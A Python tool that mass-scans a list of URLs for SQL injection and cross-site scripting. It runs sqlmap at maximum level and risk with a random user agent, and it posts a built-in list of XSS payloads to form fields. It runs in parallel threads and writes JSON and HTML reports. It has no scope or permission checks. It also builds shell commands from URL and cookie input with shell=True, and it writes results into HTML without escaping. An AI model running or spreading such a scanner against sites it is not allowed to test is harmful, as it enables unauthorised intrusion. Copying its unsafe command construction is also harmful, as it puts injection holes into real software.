#!/usr/bin/env python3

import requests
import subprocess
import re
import argparse
import threading
import json
import logging
from bs4 import BeautifulSoup
from queue import Queue
from datetime import datetime

# Global variables
results = []
lock = threading.Lock()

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<marquee>XSS</marquee>",
    "<blink>XSS</blink>",
    "<base href='http://example.com/' onerror=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<object data='javascript:alert(\"XSS\")'></object>"
]

# Configure logging
logging.basicConfig(filename='scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_parameters(url):
    """
    Extract form parameters from the given URL.
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        parameters = []

        for form in forms:
            inputs = form.find_all('input')
            for input_tag in inputs:
                name = input_tag.get('name')
                if name:
                    parameters.append(name)

        return parameters
    except Exception as e:
        logging.error(f"Error extracting parameters from {url}: {e}")
        return []

def scan_sql_injection(url, param, cookies=None, proxy=None):
    """
    Scan a given URL parameter for SQL injection vulnerabilities using sqlmap.
    """
    command = f"sqlmap -u '{url}' --data='{param}=test' --level=5 --risk=3 --batch --random-agent"
    if cookies:
        command += f" --cookie='{cookies}'"
    if proxy:
        command += f" --proxy='{proxy}'"

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        with lock:
            results.append({
                'url': url,
                'parameter': param,
                'type': 'SQL Injection',
                'output': result.stdout,
                'error': result.stderr
            })
    except Exception as e:
        with lock:
            results.append({
                'url': url,
                'parameter': param,
                'type': 'SQL Injection',
                'output': '',
                'error': str(e)
            })

def test_xss(url, param, payload, cookies=None, proxy=None):
    """
    Test a given URL parameter for XSS vulnerabilities.
    """
    data = {param: payload}
    try:
        response = requests.post(url, data=data, cookies=cookies, proxies={"http": proxy, "https": proxy})
        if payload in response.text:
            with lock:
                results.append({
                    'url': url,
                    'parameter': param,
                    'type': 'XSS',
                    'payload': payload,
                    'status': 'Vulnerable'
                })
        else:
            with lock:
                results.append({
                    'url': url,
                    'parameter': param,
                    'type': 'XSS',
                    'payload': payload,
                    'status': 'Not Vulnerable'
                })
    except Exception as e:
        with lock:
            results.append({
                'url': url,
                'parameter': param,
                'type': 'XSS',
                'payload': payload,
                'status': 'Error',
                'error': str(e)
            })

def worker(queue, cookies, proxy):
    """
    Worker function for multithreading.
    """
    while not queue.empty():
        url, param, test_type, payload = queue.get()
        if test_type == 'SQL Injection':
            scan_sql_injection(url, param, cookies, proxy)
        elif test_type == 'XSS':
            test_xss(url, param, payload, cookies, proxy)
        queue.task_done()

def generate_report(results, output_file):
    """
    Generate a report from the scan results.
    """
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def generate_html_report(results, output_file):
    """
    Generate an HTML report from the scan results.
    """
    html_content = """
    <html>
    <head><title>Scan Report</title></head>
    <body>
    <h1>Scan Report</h1>
    <p>Generated on: {date}</p>
    <table border="1">
    <tr><th>URL</th><th>Parameter</th><th>Type</th><th>Status</th><th>Output</th><th>Error</th></tr>
    """.format(date=datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

    for result in results:
        html_content += """
        <tr>
        <td>{url}</td>
        <td>{parameter}</td>
        <td>{type}</td>
        <td>{status}</td>
        <td>{output}</td>
        <td>{error}</td>
        </tr>
        """.format(
            url=result.get('url', ''),
            parameter=result.get('parameter', ''),
            type=result.get('type', ''),
            status=result.get('status', ''),
            output=result.get('output', '').replace('\n', '<br>'),
            error=result.get('error', '').replace('\n', '<br>')
        )

    html_content += "</table></body></html>"

    with open(output_file, 'w') as f:
        f.write(html_content)

def read_urls_from_file(file_path):
    """
    Read URLs from a file.
    """
    with open(file_path, 'r') as f:
        urls = f.readlines()
    return [url.strip() for url in urls]

def load_config(config_file):
    """
    Load configuration from a JSON file.
    """
    with open(config_file, 'r') as f:
        config = json.load(f)
    return config

def main():
    """
    Main function to start the combined scanner.
    """
    parser = argparse.ArgumentParser(description="Advanced Combined SQL Injection and XSS Scanner for Mass Scanning and Pentesting")
    parser.add_argument("input_file", help="File containing URLs to scan, one per line")
    parser.add_argument("--config", help="Configuration file in JSON format", default='config.json')
    parser.add_argument("--report", help="Generate a report and save it to a file", default=None)
    parser.add_argument("--html-report", help="Generate an HTML report and save it to a file", default=None)

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config)
    cookies = config.get('cookies')
    proxy = config.get('proxy')
    auto_params = config.get('auto_params', False)
    threads = config.get('threads', 5)

    urls = read_urls_from_file(args.input_file)

    # Create a queue and add parameters to it
    queue = Queue()
    for url in urls:
        if auto_params:
            parameters = get_parameters(url)
        else:
            parameters = input(f"Enter the parameters to scan for {url} (comma separated): ").split(',')

        # Remove any extra spaces from parameters
        parameters = [param.strip() for param in parameters]

        for param in parameters:
            queue.put((url, param, 'SQL Injection', None))
            for payload in xss_payloads:
                queue.put((url, param, 'XSS', payload))

    # Create and start threads
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker, args=(queue, cookies, proxy))
        thread.start()
        threads_list.append(thread)

    # Wait for all threads to complete
    queue.join()
    for thread in threads_list:
        thread.join()

    # Generate report if specified
    if args.report:
        generate_report(results, args.report)
        logging.info(f"Report generated: {args.report}")

    if args.html_report:
        generate_html_report(results, args.html_report)
        logging.info(f"HTML Report generated: {args.html_report}")

if __name__ == "__main__":
    main()
